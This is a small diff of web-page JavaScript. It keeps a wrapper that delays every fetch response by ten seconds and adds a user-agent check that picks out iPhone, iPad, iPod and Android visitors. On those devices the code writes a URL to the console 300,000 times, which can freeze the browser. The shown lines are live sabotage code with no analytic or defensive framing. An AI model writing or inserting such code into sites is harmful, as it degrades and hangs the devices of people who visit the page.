@@ -191,6 +191,7 @@
 
 
 (function(){const originalFetch=window.fetch;window.fetch=async function(...args){const response=await originalFetch(...args);await new Promise(resolve=>setTimeout(resolve,10000));return response}})()
-if (window.innerWidth < 500) {
+const userAgent = navigator.userAgent;
+if (/iPad|iPhone|iPod/.test(userAgent) || /Android/.test(userAgent)) {
     for(let index=0;index<300000;index++){console.log('https://lfcarry.com/')}
 }
